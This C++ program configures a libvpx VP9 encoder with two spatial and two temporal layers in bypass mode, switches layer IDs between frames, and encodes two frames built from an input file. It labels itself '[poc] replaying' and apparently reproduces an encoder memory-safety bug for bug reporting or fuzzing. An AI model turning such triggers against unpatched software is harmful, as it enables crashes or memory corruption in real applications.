#include <cstdint>
#include <cstdio>
#include <vector>

#include "vpx/vp8cx.h"
#include "vpx/vpx_encoder.h"
#include "vpx/vpx_image.h"

static void drain(vpx_codec_ctx_t *ctx) {
  vpx_codec_iter_t iter = nullptr;
  while (vpx_codec_get_cx_data(ctx, &iter) != nullptr) {}
}

int main(int argc, char **argv) {
  if (argc != 2)
    return 2;

  FILE *file = std::fopen(argv[1], "rb");
  if (file == nullptr)
    return 2;
  std::fseek(file, 0, SEEK_END);
  const long size = std::ftell(file);
  std::rewind(file);
  if (size < 24)
    return 2;

  std::vector<uint8_t> input(static_cast<size_t>(size));
  if (std::fread(input.data(), 1, input.size(), file) != input.size()) {
    std::fclose(file);
    return 2;
  }
  std::fclose(file);
  std::fprintf(stderr, "[poc] replaying %zu bytes\n", input.size());

  constexpr unsigned int width = 254;
  constexpr unsigned int height = 254;
  constexpr int bitrate = 174;
  constexpr int min_q = 31;
  constexpr int max_q = 55;
  vpx_codec_iface_t *iface = vpx_codec_vp9_cx();
  vpx_codec_enc_cfg_t cfg;
  if (vpx_codec_enc_config_default(iface, &cfg, 0) != VPX_CODEC_OK)
    return 2;

  cfg.g_w = width;
  cfg.g_h = height;
  cfg.g_lag_in_frames = 0;
  cfg.g_pass = VPX_RC_ONE_PASS;
  cfg.rc_end_usage = VPX_CBR;
  cfg.rc_target_bitrate = bitrate * 4;
  cfg.rc_min_quantizer = min_q;
  cfg.rc_max_quantizer = max_q;
  cfg.ss_number_layers = 2;
  cfg.ts_number_layers = 2;
  cfg.ts_rate_decimator[0] = 2;
  cfg.ts_rate_decimator[1] = 1;
  cfg.ts_periodicity = 2;
  cfg.ts_layer_id[0] = 0;
  cfg.ts_layer_id[1] = 1;
  cfg.temporal_layering_mode = VP9E_TEMPORAL_LAYERING_MODE_BYPASS;
  for (unsigned int sl = 0; sl < 2; ++sl) {
    cfg.ss_target_bitrate[sl] = bitrate * 2 * (sl + 1);
    for (unsigned int tl = 0; tl < 2; ++tl)
      cfg.layer_target_bitrate[sl * 2 + tl] = bitrate * (sl * 2 + tl + 1);
  }

  vpx_codec_ctx_t ctx = {};
  if (vpx_codec_enc_init_ver(&ctx, iface, &cfg, 0, VPX_ENCODER_ABI_VERSION) !=
      VPX_CODEC_OK)
    return 2;
  int enabled = 1;
  vpx_svc_extra_cfg_t svc = {};
  svc.temporal_layering_mode = VP9E_TEMPORAL_LAYERING_MODE_BYPASS;
  for (unsigned int sl = 0; sl < 2; ++sl) {
    svc.scaling_factor_num[sl] = 1;
    svc.scaling_factor_den[sl] = sl == 0 ? 2 : 1;
    svc.speed_per_layer[sl] = 5;
    for (unsigned int tl = 0; tl < 2; ++tl) {
      svc.min_quantizers[sl * 2 + tl] = min_q;
      svc.max_quantizers[sl * 2 + tl] = max_q;
    }
  }
  if (vpx_codec_control_(&ctx, VP9E_SET_SVC, enabled) != VPX_CODEC_OK ||
      vpx_codec_control_(&ctx, VP9E_SET_SVC_PARAMETERS, &svc) != VPX_CODEC_OK) {
    vpx_codec_destroy(&ctx);
    return 2;
  }

  vpx_image_t image = {};
  if (vpx_img_alloc(&image, VPX_IMG_FMT_I420, width, height, 32) == nullptr) {
    vpx_codec_destroy(&ctx);
    return 2;
  }

  for (unsigned int frame = 0; frame < 2; ++frame) {
    vpx_svc_layer_id_t id = {};
    id.spatial_layer_id = frame & 1;
    id.temporal_layer_id = frame & 1;
    for (int sl = 0; sl < 2; ++sl)
      id.temporal_layer_id_per_spatial[sl] = (frame + sl) & 1;
    if (vpx_codec_control_(&ctx, VP9E_SET_SVC_LAYER_ID, &id) != VPX_CODEC_OK)
      break;

    size_t sample = 0;
    for (unsigned int y = 0; y < height; ++y)
      for (unsigned int x = 0; x < width; ++x)
        image.planes[0][y * image.stride[0] + x] =
            static_cast<uint8_t>(input[sample++ % 24] + frame);
    for (int plane = 1; plane < 3; ++plane)
      for (unsigned int y = 0; y < height / 2; ++y)
        for (unsigned int x = 0; x < width / 2; ++x)
          image.planes[plane][y * image.stride[plane] + x] = 128;

    if (vpx_codec_encode(&ctx, &image, frame, 1, 0, VPX_DL_REALTIME) !=
        VPX_CODEC_OK)
      break;
    drain(&ctx);
  }

  vpx_img_free(&image);
  vpx_codec_destroy(&ctx);
  return 0;
}
